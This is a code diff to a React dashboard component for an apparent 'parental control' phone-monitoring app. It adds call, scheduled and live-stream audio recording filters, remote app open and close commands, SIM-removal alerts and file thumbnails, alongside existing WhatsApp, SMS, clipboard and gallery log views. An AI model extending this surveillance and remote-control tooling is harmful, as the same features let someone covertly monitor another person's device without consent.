@@ -30,6 +30,10 @@ import {
   Eye,
   ShieldAlert,
   Camera,
+  Play,
+  Square,
+  Home,
+  AlertTriangle,
 } from "lucide-react";
 
 export type ActivityTabType =
@@ -43,11 +47,13 @@ export type ActivityTabType =
   | "sim"
   | "clipboard"
   | "gallery"
-  | "files";
+  | "files"
+  | "alerts";
 
 interface ActivityLogListProps {
   activityTab: ActivityTabType;
   setActivityTab: (tab: ActivityTabType) => void;
+  securityAlerts?: any[];
   whatsappLogs: any[];
   callLogs: any[];
   smsLogs: any[];
@@ -74,6 +80,7 @@ interface ActivityLogListProps {
 export default function ActivityLogList({
   activityTab,
   setActivityTab,
+  securityAlerts = [],
   whatsappLogs,
   callLogs,
   smsLogs,
@@ -100,8 +107,9 @@ export default function ActivityLogList({
   const [selectedFile, setSelectedFile] = useState<any | null>(null);
   const [copiedPath, setCopiedPath] = useState<string | null>(null);
   const [appSearch, setAppSearch] = useState("");
-  const [gallerySection, setGallerySection] = useState<"snapshots" | "device">("snapshots");
+  const [gallerySection, setGallerySection] = useState<"snapshots" | "device">("device");
   const [requestedFiles, setRequestedFiles] = useState<Record<string, boolean>>({});
+  const [recFilter, setRecFilter] = useState<"ALL" | "CALL" | "SCHEDULED" | "LIVE">("ALL");
 
   const handleCopyPath = (path: string) => {
     if (!path) return;
@@ -129,6 +137,7 @@ export default function ActivityLogList({
     { id: "recordings" as ActivityTabType, label: "Recordings", icon: Music, count: recordings.length },
     { id: "apps" as ActivityTabType, label: "Apps", icon: Smartphone, count: installedApps.length > 0 ? installedApps.length : packageEvents.length },
     { id: "sim" as ActivityTabType, label: "SIM Info", icon: Radio, count: simInfo ? 1 : 0 },
+    { id: "alerts" as ActivityTabType, label: "Alerts", icon: ShieldAlert, count: securityAlerts.length },
   ];
 
   return (
@@ -295,27 +304,141 @@ export default function ActivityLogList({
 
       {/* Recordings Sub-Tab */}
       {activityTab === "recordings" && (
-        <div className="space-y-2 mt-2">
-          {recordings.length === 0 ? (
-            <p className="text-center py-10 text-xs text-gray-500">No audio recordings saved.</p>
-          ) : (
-            recordings.map((rec, idx) => (
-              <div
-                key={rec.id || idx}
-                className="p-3.5 bg-[#1B1B22] border border-[#272733] rounded-xl flex flex-col gap-2 text-xs"
-              >
-                <div className="flex items-center justify-between">
-                  <span className="font-bold text-white flex items-center gap-1.5">
-                    <Music className="w-3.5 h-3.5 text-blue-400" />
-                    {rec.type === "call" ? "Call Audio Recording" : "Mic Recording"}
-                  </span>
-                  <span className="text-[10px] text-gray-500">
-                    {rec.timestamp ? new Date(rec.timestamp).toLocaleString() : ""}
-                  </span>
-                </div>
-                {(() => {
-                  const audioUrl = rec.downloadUrl || rec.storageUrl;
-                  return audioUrl ? (
+        <div className="space-y-3 mt-2">
+          {/* Filter Chips Bar */}
+          {(() => {
+            const callCount = recordings.filter(
+              (r) => r.type === "call" || r.streamType === "call"
+            ).length;
+            const schedCount = recordings.filter(
+              (r) =>
+                r.type === "scheduled" ||
+                r.streamType === "scheduled" ||
+                (r.localFilePath && r.localFilePath.includes("scheduled"))
+            ).length;
+            const liveCount = recordings.filter(
+              (r) =>
+                r.type !== "call" &&
+                r.streamType !== "call" &&
+                r.type !== "scheduled" &&
+                r.streamType !== "scheduled" &&
+                !(r.localFilePath && r.localFilePath.includes("scheduled")) &&
+                !r.streamType?.includes("photo")
+            ).length;
+
+            return (
+              <div className="flex items-center gap-2 overflow-x-auto pb-1">
+                <button
+                  type="button"
+                  onClick={() => setRecFilter("ALL")}
+                  className={`px-3 py-1.5 rounded-xl text-xs font-semibold transition shrink-0 ${
+                    recFilter === "ALL"
+                      ? "bg-blue-600 text-white shadow-md shadow-blue-600/30"
+                      : "bg-[#1E1E26] text-gray-400 hover:text-white"
+                  }`}
+                >
+                  All ({recordings.length})
+                </button>
+                <button
+                  type="button"
+                  onClick={() => setRecFilter("CALL")}
+                  className={`px-3 py-1.5 rounded-xl text-xs font-semibold flex items-center gap-1.5 transition shrink-0 ${
+                    recFilter === "CALL"
+                      ? "bg-blue-600 text-white shadow-md shadow-blue-600/30"
+                      : "bg-[#1E1E26] text-gray-400 hover:text-white"
+                  }`}
+                >
+                  <Phone className="w-3 h-3 text-sky-400" />
+                  <span>Calls ({callCount})</span>
+                </button>
+                <button
+                  type="button"
+                  onClick={() => setRecFilter("SCHEDULED")}
+                  className={`px-3 py-1.5 rounded-xl text-xs font-semibold flex items-center gap-1.5 transition shrink-0 ${
+                    recFilter === "SCHEDULED"
+                      ? "bg-purple-600 text-white shadow-md shadow-purple-600/30"
+                      : "bg-[#1E1E26] text-gray-400 hover:text-white"
+                  }`}
+                >
+                  <Music className="w-3 h-3 text-purple-400" />
+                  <span>Scheduled ({schedCount})</span>
+                </button>
+                <button
+                  type="button"
+                  onClick={() => setRecFilter("LIVE")}
+                  className={`px-3 py-1.5 rounded-xl text-xs font-semibold flex items-center gap-1.5 transition shrink-0 ${
+                    recFilter === "LIVE"
+                      ? "bg-red-600 text-white shadow-md shadow-red-600/30"
+                      : "bg-[#1E1E26] text-gray-400 hover:text-white"
+                  }`}
+                >
+                  <span className="w-2 h-2 rounded-full bg-red-400" />
+                  <span>Live Stream ({liveCount})</span>
+                </button>
+              </div>
+            );
+          })()}
+
+          {/* List Content */}
+          {(() => {
+            const filtered = recordings.filter((rec) => {
+              const isCall = rec.type === "call" || rec.streamType === "call";
+              const isScheduled =
+                rec.type === "scheduled" ||
+                rec.streamType === "scheduled" ||
+                (rec.localFilePath && rec.localFilePath.includes("scheduled"));
+              if (recFilter === "CALL") return isCall;
+              if (recFilter === "SCHEDULED") return isScheduled;
+              if (recFilter === "LIVE") return !isCall && !isScheduled && !rec.streamType?.includes("photo");
+              return true;
+            });
+
+            if (filtered.length === 0) {
+              return (
+                <p className="text-center py-10 text-xs text-gray-500">
+                  {recFilter === "ALL"
+                    ? "No audio recordings saved yet."
+                    : `No ${recFilter.toLowerCase()} recordings found.`}
+                </p>
+              );
+            }
+
+            return filtered.map((rec, idx) => {
+              const isCall = rec.type === "call" || rec.streamType === "call";
+              const isScheduled =
+                rec.type === "scheduled" ||
+                rec.streamType === "scheduled" ||
+                (rec.localFilePath && rec.localFilePath.includes("scheduled"));
+              const audioUrl = rec.downloadUrl || rec.storageUrl;
+
+              return (
+                <div
+                  key={rec.id || idx}
+                  className="p-3.5 bg-[#1B1B22] border border-[#272733] rounded-xl flex flex-col gap-2 text-xs"
+                >
+                  <div className="flex items-center justify-between">
+                    <div className="flex items-center gap-2">
+                      <span
+                        className={`text-[10px] px-2 py-0.5 rounded-full font-bold uppercase tracking-wider ${
+                          isCall
+                            ? "bg-sky-950/70 text-sky-400 border border-sky-800/40"
+                            : isScheduled
+                            ? "bg-purple-950/70 text-purple-400 border border-purple-800/40"
+                            : "bg-rose-950/70 text-rose-400 border border-rose-800/40"
+                        }`}
+                      >
+                        {isCall ? "📞 Call Recording" : isScheduled ? "⏰ Scheduled Recording" : "🔴 Live Recording"}
+                      </span>
+                      {rec.label && (
+                        <span className="text-[11px] text-gray-300 font-medium">{rec.label}</span>
+                      )}
+                    </div>
+                    <span className="text-[10px] text-gray-500">
+                      {rec.timestamp ? new Date(rec.timestamp).toLocaleString() : ""}
+                    </span>
+                  </div>
+
+                  {audioUrl ? (
                     <div className="flex flex-col gap-1.5 mt-1">
                       <audio
                         controls
@@ -337,38 +460,48 @@ export default function ActivityLogList({
                           className="text-blue-400 hover:underline flex items-center gap-1 font-medium"
                         >
                           <Download className="w-3 h-3" />
-                          <span>Download Recording</span>
+                          <span>Download to Laptop / PC</span>
                         </a>
                       </div>
                     </div>
                   ) : (
                     <p className="text-[11px] text-gray-400">Audio link preparing or unavailable</p>
-                  );
-                })()}
-              </div>
-            ))
-          )}
+                  )}
+                </div>
+              );
+            });
+          })()}
         </div>
       )}
 
       {/* Installed Apps & Parental Control Sub-Tab */}
       {activityTab === "apps" && (
         <div className="space-y-3 mt-2">
-          {/* Top Bar: Search & Rescan */}
+          {/* Top Bar: Search & Rescan & Go Home */}
           <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2.5">
             <div>
-              <p className="text-xs text-gray-300 font-semibold">Installed Applications & App Blocker</p>
+              <p className="text-xs text-gray-300 font-semibold">Installed Applications & Remote App Control</p>
               <p className="text-[11px] text-gray-400">
-                Child ke phone ke apps dekhein, block/unblock karein ya uninstall request bhejein
+                Child ke phone ke apps remotely open karein (▶), close karein (⏹), block ya uninstall karein
               </p>
             </div>
-            <button
-              onClick={() => sendCommand("SYNC_MEDIA", true)}
-              className="px-2.5 py-1.5 bg-[#252530] hover:bg-[#2e2e3d] text-gray-300 text-[11px] rounded-lg flex items-center gap-1.5 transition self-start sm:self-auto shrink-0"
-            >
-              <RefreshCw className="w-3.5 h-3.5" />
-              <span>Rescan Installed Apps</span>
-            </button>
+            <div className="flex items-center gap-2 self-start sm:self-auto shrink-0">
+              <button
+                onClick={() => sendCommand("CLOSE_APP", "ALL")}
+                className="px-2.5 py-1.5 bg-amber-900/30 hover:bg-amber-800/40 text-amber-300 border border-amber-700/50 text-[11px] font-semibold rounded-lg flex items-center gap-1.5 transition"
+                title="Closes all currently open apps on child phone and returns to Home screen"
+              >
+                <Home className="w-3.5 h-3.5" />
+                <span>Go Home (Close Active)</span>
+              </button>
+              <button
+                onClick={() => sendCommand("SYNC_MEDIA", true)}
+                className="px-2.5 py-1.5 bg-[#252530] hover:bg-[#2e2e3d] text-gray-300 text-[11px] rounded-lg flex items-center gap-1.5 transition shrink-0"
+              >
+                <RefreshCw className="w-3.5 h-3.5" />
+                <span>Rescan Apps</span>
+              </button>
+            </div>
           </div>
 
           {/* Search Bar */}
@@ -399,7 +532,7 @@ export default function ActivityLogList({
                 <div className="text-center py-12 text-xs text-gray-500 bg-[#16161D] rounded-xl border border-[#272733]">
                   <Smartphone className="w-8 h-8 text-gray-600 mx-auto mb-2" />
                   <p>No installed apps found matching your search.</p>
-                  <p className="text-[11px] text-gray-600 mt-1">Click "Rescan Installed Apps" to index phone apps.</p>
+                  <p className="text-[11px] text-gray-600 mt-1">Click "Rescan Apps" to index phone apps.</p>
                 </div>
               );
             }
@@ -449,8 +582,28 @@ export default function ActivityLogList({
                         </div>
                       </div>
 
-                      {/* Action Buttons: Block/Unblock & Uninstall */}
+                      {/* Action Buttons: Launch, Close, Block/Unblock & Uninstall */}
                       <div className="flex items-center gap-1.5 shrink-0">
+                        {/* Remote Launch App */}
+                        <button
+                          onClick={() => sendCommand("OPEN_APP", app.packageName)}
+                          className="px-2 py-1.5 bg-blue-600/20 hover:bg-blue-600/40 text-blue-300 border border-blue-500/40 rounded-lg text-xs font-semibold flex items-center gap-1 transition"
+                          title="Remotely launch/open this app on child's phone"
+                        >
+                          <Play className="w-3.5 h-3.5 fill-blue-300" />
+                          <span className="hidden sm:inline">Open</span>
+                        </button>
+
+                        {/* Remote Close App */}
+                        <button
+                          onClick={() => sendCommand("CLOSE_APP", app.packageName)}
+                          className="px-2 py-1.5 bg-amber-600/20 hover:bg-amber-600/40 text-amber-300 border border-amber-500/40 rounded-lg text-xs font-semibold flex items-center gap-1 transition"
+                          title="Remotely kill/close this app"
+                        >
+                          <Square className="w-3.5 h-3.5 fill-amber-300" />
+                          <span className="hidden sm:inline">Close</span>
+                        </button>
+
                         <button
                           onClick={() => onToggleBlockApp?.(app.packageName, isBlocked)}
                           className={`px-2.5 py-1.5 rounded-lg text-xs font-semibold flex items-center gap-1 transition ${
@@ -493,6 +646,18 @@ export default function ActivityLogList({
       {/* SIM & Network Sub-Tab */}
       {activityTab === "sim" && (
         <div className="p-4 bg-[#1B1B22] border border-[#272733] rounded-xl text-xs space-y-3">
+          {simInfo && (simInfo.simState === "ABSENT" || simInfo.operatorName === "No SIM Card") && (
+            <div className="p-3 bg-red-950/60 border border-red-600/80 rounded-xl flex items-center gap-3 text-red-200">
+              <AlertTriangle className="w-6 h-6 text-red-400 shrink-0 animate-pulse" />
+              <div>
+                <p className="font-bold text-red-300 text-sm">CRITICAL ALERT: SIM Card Removed / Absent!</p>
+                <p className="text-xs text-red-300/80">
+                  Child ke phone se SIM card nikal diya gaya hai ya koi SIM card detect nahi ho raha.
+                </p>
+              </div>
+            </div>
+          )}
+
           {!simInfo ? (
             <p className="text-center py-8 text-gray-500">No SIM details received yet.</p>
           ) : (
@@ -507,7 +672,9 @@ export default function ActivityLogList({
               </div>
               <div className="p-3 bg-[#121217] rounded-lg border border-[#23232c]">
                 <p className="text-[10px] text-gray-400">SIM State</p>
-                <p className="text-sm font-bold text-green-400 mt-0.5">{simInfo.simState || "Active"}</p>
+                <p className={`text-sm font-bold mt-0.5 ${simInfo.simState === "ABSENT" ? "text-red-400" : "text-green-400"}`}>
+                  {simInfo.simState || "Active"}
+                </p>
               </div>
               <div className="p-3 bg-[#121217] rounded-lg border border-[#23232c]">
                 <p className="text-[10px] text-gray-400">Last Synced</p>
@@ -515,6 +682,82 @@ export default function ActivityLogList({
                   {simInfo.lastUpdated ? new Date(simInfo.lastUpdated).toLocaleString() : "Just now"}
                 </p>
               </div>
+            </div>
+          )}
+        </div>
+      )}
+
+      {/* Security Alerts Sub-Tab */}
+      {activityTab === "alerts" && (
+        <div className="space-y-3 mt-2">
+          <div className="flex items-center justify-between p-3 bg-[#16161E] rounded-xl border border-[#272733]">
+            <div>
+              <p className="text-xs font-semibold text-white">Live Security Alerts & Intruder Events</p>
+              <p className="text-[11px] text-gray-400">
+                SIM card change/removal, low battery, aur device security alerts yahan live aayenge
+              </p>
+            </div>
+            <span className="text-[10px] px-2 py-0.5 bg-red-950/60 text-red-300 border border-red-800/40 rounded-full font-bold">
+              {securityAlerts.length} Alerts
+            </span>
+          </div>
+
+          {securityAlerts.length === 0 ? (
+            <div className="text-center py-12 text-xs text-gray-500 bg-[#16161D] rounded-xl border border-[#272733]">
+              <AlertTriangle className="w-8 h-8 text-gray-600 mx-auto mb-2" />
+              <p>No security alerts recorded yet.</p>
+              <p className="text-[11px] text-gray-600 mt-1">SIM change ya unusual security activity par yahan turant alert dikhega.</p>
+            </div>
+          ) : (
+            <div className="space-y-2">
+              {securityAlerts.map((alert: any, idx: number) => {
+                const isHigh = alert.severity === "HIGH" || alert.type === "SIM_CHANGED" || alert.type === "SIM_REMOVED";
+                return (
+                  <div
+                    key={idx}
+                    className={`p-3.5 rounded-xl border flex items-start justify-between gap-3 text-xs transition ${
+                      isHigh
+                        ? "bg-red-950/30 border-red-800/50"
+                        : "bg-[#1B1B22] border-[#272733]"
+                    }`}
+                  >
+                    <div className="flex items-start gap-3">
+                      <div
+                        className={`p-2 rounded-xl shrink-0 mt-0.5 ${
+                          isHigh
+                            ? "bg-red-900/40 text-red-300 border border-red-700/50"
+                            : "bg-amber-900/40 text-amber-300 border border-amber-700/50"
+                        }`}
+                      >
+                        <AlertTriangle className="w-4 h-4" />
+                      </div>
+                      <div>
+                        <div className="flex items-center gap-2">
+                          <p className="font-bold text-white text-xs">{alert.title || alert.type}</p>
+                          <span
+                            className={`text-[9px] px-1.5 py-0.2 rounded font-bold uppercase ${
+                              isHigh
+                                ? "bg-red-900/60 text-red-200 border border-red-700/50"
+                                : "bg-amber-900/60 text-amber-200 border border-amber-700/50"
+                            }`}
+                          >
+                            {alert.type || "ALERT"}
+                          </span>
+                        </div>
+                        <p className="text-gray-300 text-xs mt-1">{alert.message}</p>
+                        {alert.extra && (
+                          <div className="mt-1.5 p-1.5 bg-[#121217] rounded text-[10px] text-gray-400 font-mono">
+                            {JSON.stringify(alert.extra)}
+                          </div>
+                        )}
+                      </div>
+                    </div>
+                    <span className="text-[10px] text-gray-500 shrink-0 whitespace-nowrap">
+                      {alert.timestamp ? new Date(alert.timestamp).toLocaleTimeString() : ""}
+                    </span>
+                  </div>
+                );
+              })}
             </div>
           )}
         </div>
@@ -688,7 +931,7 @@ export default function ActivityLogList({
                 <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
                   {mediaGallery.map((item, idx) => {
                     const isVideo = item.fileType === "VIDEO" || (item.fileName && item.fileName.endsWith(".mp4"));
-                    const imgSrc = item.thumbnailBase64 || item.downloadUrl || item.storageUrl;
+                    const imgSrc = item.thumbnailBase64 || item.downloadUrl || item.storageUrl || item.mediaUrl || "";
                     const hasImage = Boolean(imgSrc);
 
                     return (
@@ -901,6 +1144,15 @@ export default function ActivityLogList({
                 return sortedItems.map((item, idx) => {
                   const isDir = Boolean(item.directory ?? item.isDirectory);
                   const isImg = !isDir && Boolean((item.name || "").match(/\.(jpg|jpeg|png|webp|heic)$/i));
+                  const matched = isImg
+                    ? mediaGallery.find(
+                        (m) =>
+                          (m.filePath && item.path && m.filePath === item.path) ||
+                          (m.fileName && item.name && m.fileName === item.name)
+                      )
+                    : null;
+                  const itemThumbnail = item.thumbnailBase64 || matched?.thumbnailBase64 || "";
+                  const itemDownloadUrl = item.downloadUrl || matched?.downloadUrl || item.storageUrl || matched?.storageUrl || "";
 
                   return (
                     <div
@@ -915,6 +1167,8 @@ export default function ActivityLogList({
                             fileType: "IMAGE",
                             sizeBytes: item.sizeBytes,
                             dateAdded: item.lastModified,
+                            thumbnailBase64: itemThumbnail,
+                            downloadUrl: itemDownloadUrl,
                           });
                         } else {
                           setSelectedFile(item);
@@ -930,23 +1184,31 @@ export default function ActivityLogList({
                       title={isDir ? "Click to open folder" : "Click to view file"}
                     >
                       <div className="flex items-center gap-2.5 min-w-0">
-                        <div
-                          className={`p-2 rounded-lg shrink-0 ${
-                            isDir
-                              ? "bg-amber-600/20 text-amber-400"
-                              : isImg
-                              ? "bg-purple-600/20 text-purple-400"
-                              : "bg-blue-600/20 text-blue-400"
-                          }`}
-                        >
-                          {isDir ? (
-                            <Folder className="w-4 h-4" />
-                          ) : isImg ? (
-                            <ImageIcon className="w-4 h-4" />
-                          ) : (
-                            <File className="w-4 h-4" />
-                          )}
-                        </div>
+                        {isImg && itemThumbnail ? (
+                          <img
+                            src={itemThumbnail}
+                            alt=""
+                            className="w-8 h-8 rounded-lg object-cover shrink-0 border border-purple-500/50 shadow-sm"
+                          />
+                        ) : (
+                          <div
+                            className={`p-2 rounded-lg shrink-0 ${
+                              isDir
+                                ? "bg-amber-600/20 text-amber-400"
+                                : isImg
+                                ? "bg-purple-600/20 text-purple-400"
+                                : "bg-blue-600/20 text-blue-400"
+                            }`}
+                          >
+                            {isDir ? (
+                              <Folder className="w-4 h-4" />
+                            ) : isImg ? (
+                              <ImageIcon className="w-4 h-4" />
+                            ) : (
+                              <File className="w-4 h-4" />
+                            )}
+                          </div>
+                        )}
                         <div className="min-w-0">
                           <div className="flex items-center gap-1.5">
                             <p className="text-white font-medium truncate" title={item.name}>
@@ -1022,7 +1284,20 @@ export default function ActivityLogList({
 
             {/* Photo Preview Container */}
             {(() => {
-              const imgUrl = selectedPhotoViewer.downloadUrl || selectedPhotoViewer.storageUrl || selectedPhotoViewer.thumbnailBase64;
+              const dynamicMatch = selectedPhotoViewer?.filePath
+                ? mediaGallery.find(
+                    (m) =>
+                      (m.filePath && m.filePath === selectedPhotoViewer.filePath) ||
+                      (m.fileName && selectedPhotoViewer.fileName && m.fileName === selectedPhotoViewer.fileName)
+                  )
+                : null;
+              const imgUrl =
+                selectedPhotoViewer.downloadUrl ||
+                selectedPhotoViewer.storageUrl ||
+                selectedPhotoViewer.thumbnailBase64 ||
+                dynamicMatch?.thumbnailBase64 ||
+                dynamicMatch?.downloadUrl ||
+                dynamicMatch?.storageUrl;
 
               return imgUrl ? (
                 <div className="space-y-3">
